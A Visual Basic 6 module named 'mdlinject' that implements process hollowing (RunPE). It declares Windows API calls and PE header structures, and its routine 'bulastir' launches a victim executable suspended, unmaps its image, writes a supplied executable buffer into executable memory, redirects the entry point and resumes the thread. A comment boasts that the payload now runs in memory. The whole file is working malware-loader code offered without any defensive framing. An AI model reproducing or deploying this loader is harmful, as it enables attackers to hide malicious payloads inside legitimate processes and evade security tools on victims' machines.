Attribute VB_Name = "mdlinject"
Option Explicit

Declare Sub RtlMoveMemory Lib "kernel32" (Dest As Any, Src As Any, ByVal L As Long)

Declare Function GetModuleFileNameA Lib "kernel32" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Declare Function CreateProcessA Lib "kernel32" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Declare Function GetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
Declare Function SetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Declare Function ResumeThread Lib "kernel32" (ByVal hThread As Long) As Long
Declare Function NtUnmapViewOfSection Lib "ntdll" (ByVal hProcess As Long, ByVal BaseAddress As Long) As Long

Const CONTEXT_X86 = &H10000
Const CONTEXT_CONTROL = (CONTEXT_X86 Or &H1)
Const CONTEXT_INTEGER = (CONTEXT_X86 Or &H2)
Const CONTEXT_SEGMENTS = (CONTEXT_X86 Or &H4)
Const CONTEXT_FULL = (CONTEXT_CONTROL Or CONTEXT_INTEGER Or CONTEXT_SEGMENTS)

Const MAX_PATH As Integer = 260
Const CREATE_SUSPENDED = &H4
Const MEM_COMMIT As Long = &H1000
Const MEM_RESERVE As Long = &H2000

Const PAGE_NOCACHE As Long = &H200
Const PAGE_EXECUTE_READWRITE As Long = &H40
Const PAGE_EXECUTE_WRITECOPY As Long = &H80
Const PAGE_EXECUTE_READ As Long = &H20
Const PAGE_EXECUTE As Long = &H10
Const PAGE_READONLY As Long = &H2
Const PAGE_WRITECOPY As Long = &H8
Const PAGE_NOACCESS As Long = &H1
Const PAGE_READWRITE As Long = &H4

Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Type STARTUPINFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * MAX_PATH
End Type

Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessID As Long
    dwThreadID As Long
End Type

Const SIZE_OF_80387_REGISTERS = 80

Type FLOATING_SAVE_AREA
     ControlWord As Long
     StatusWord As Long
     TagWord As Long
     ErrorOffset As Long
     ErrorSelector As Long
     DataOffset As Long
     DataSelector As Long
     RegisterArea(1 To SIZE_OF_80387_REGISTERS) As Byte
     Cr0NpxState As Long
End Type

Public Type CONTEXT
    ContextFlags As Long

    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long

    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Enum ImageSignatureTypes
    IMAGE_DOS_SIGNATURE = &H5A4D
    IMAGE_OS2_SIGNATURE = &H454E
    IMAGE_OS2_SIGNATURE_LE = &H454C
    IMAGE_VXD_SIGNATURE = &H454C
    IMAGE_NT_SIGNATURE = &H4550
End Enum

Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16

Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY
End Type

Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Const IMAGE_SIZEOF_SHORT_NAME = 8

Type IMAGE_SECTION_HEADER
   SecName As String * IMAGE_SIZEOF_SHORT_NAME
   VirtualSize As Long
   VirtualAddress  As Long
   SizeOfRawData As Long
   PointerToRawData As Long
   PointerToRelocations As Long
   PointerToLinenumbers As Long
   NumberOfRelocations As Integer
   NumberOfLinenumbers As Integer
   characteristics  As Long
End Type

Sub bulastir(ByVal sVictim As String, lpBuffer() As Byte)

Dim I As Long
Dim Pidh As IMAGE_DOS_HEADER
Dim Pinh As IMAGE_NT_HEADERS
Dim Pish As IMAGE_SECTION_HEADER
Dim Si As STARTUPINFO
Dim Pi As PROCESS_INFORMATION
Dim Ctx As CONTEXT

'On Local Error Resume Next
    RtlMoveMemory Si, 0, Len(Si)
    Si.cb = Len(Si)
    Ctx.ContextFlags = CONTEXT_FULL
    
    RtlMoveMemory Pidh, lpBuffer(0), Len(Pidh)
    RtlMoveMemory Pinh, lpBuffer(Pidh.e_lfanew), Len(Pinh)
    
'If Pidh.e_magic <> IIMAGE_DOS_SIGNATURE Then: Exit Sub ' Do we realy need this we no its an EXE right??
'If Pinh.Signature <> IMAGE_NT_SIGNATURE Then: Exit Sub

    CreateProcessA sVictim, vbNullString, 0, 0, False, CREATE_SUSPENDED, 0, 0, Si, Pi
    NtUnmapViewOfSection Pi.hProcess, ByVal Pinh.OptionalHeader.ImageBase
    VirtualAllocEx Pi.hProcess, ByVal Pinh.OptionalHeader.ImageBase, Pinh.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE
    WriteProcessMemory Pi.hProcess, ByVal Pinh.OptionalHeader.ImageBase, lpBuffer(0), Pinh.OptionalHeader.SizeOfHeaders, 0

For I = 0 To Pinh.FileHeader.NumberOfSections - 1

    RtlMoveMemory Pish, lpBuffer(Pidh.e_lfanew + Len(Pinh) + Len(Pish) * I), Len(Pish)
    WriteProcessMemory Pi.hProcess, ByVal Pinh.OptionalHeader.ImageBase + Pish.VirtualAddress, lpBuffer(Pish.PointerToRawData), Pish.SizeOfRawData, 0

Next I

    GetThreadContext Pi.hThread, Ctx
    WriteProcessMemory Pi.hProcess, ByVal Ctx.Ebx + 8, Pinh.OptionalHeader.ImageBase, 4, 0
        Ctx.Eax = Pinh.OptionalHeader.ImageBase + Pinh.OptionalHeader.AddressOfEntryPoint
    SetThreadContext Pi.hThread, Ctx
    ResumeThread Pi.hThread
    ' our exe is now running in memory without the bugs of RunPe example ;)
Exit Sub

End Sub

Function ThisExe() As String
Dim ModName As String * 256
Dim I As Long
    I = GetModuleFileNameA(App.hInstance, ModName, Len(ModName))
    ThisExe = Left$(ModName, I)
End Function

